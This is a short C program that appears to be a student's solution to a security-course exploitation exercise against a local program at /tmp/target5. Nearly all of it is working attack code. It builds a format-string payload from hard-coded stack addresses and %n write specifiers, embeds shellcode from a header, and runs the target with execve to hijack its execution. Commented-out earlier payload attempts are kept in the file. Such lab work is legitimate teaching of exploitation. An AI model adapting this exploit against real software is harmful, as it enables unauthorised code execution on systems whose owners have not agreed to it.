#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"

int main(void)
{
  int i;
  char *args[3];
  char *env[1];
  char buf[400];
  memset(buf, 0x90, 400);

  //strncpy(buf, "\x50\xfb\xff\xbf%08x%08x%08x%n", 18); 
  //strncpy(buf, "\x3c\xf3\xff\xbf\x3d\xfe\xff\xbf\x3e\xfe\xff\xbf\x3f\xfe\xff\xbf%08x%08x%08x%n%n%n%n", 36);
  //strncpy(buf, "%16u%n%16u%n%32u%n%64u%n1\x3c\xf3\xff\xbf1\x3d\xfe\xff\xbf1\x3e\xfe\xff\xbf1\x3f\xfe\xff\xbf", 44);

  strcpy(buf, "\x3c\xfe\xff\xbf\x01\x01\x01\x01\x3d\xfe\xff\xbf\x01\x01\x01\x01\x3e\xfe\xff\xbf\x01\x01\x01\x01"
      "\x3f\xfe\xff\xbf%08x%08x%147x%n%64x%n%x%n%x%n");//%32x%n%220x%n%03x%n%192x%n"); 


  //strncpy(buf, "\x3c\xfe\xff\xbf\x3d\xfe\xff\xbf\x3e\xfe\xff\xbf\x3f\xfe\xff\xbf%08x%08x%08x%n%n%n%n", 36);
  strncpy(buf+353, shellcode, 45);
  
  //for(i = 0; i < 113; i++) {
    //strncpy(buf+4+(i*4), "%08x", 4); 
  //}
  
  //strncpy(buf+305, "%n", 2);
  
  args[0] = TARGET; 
  args[1] = buf;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
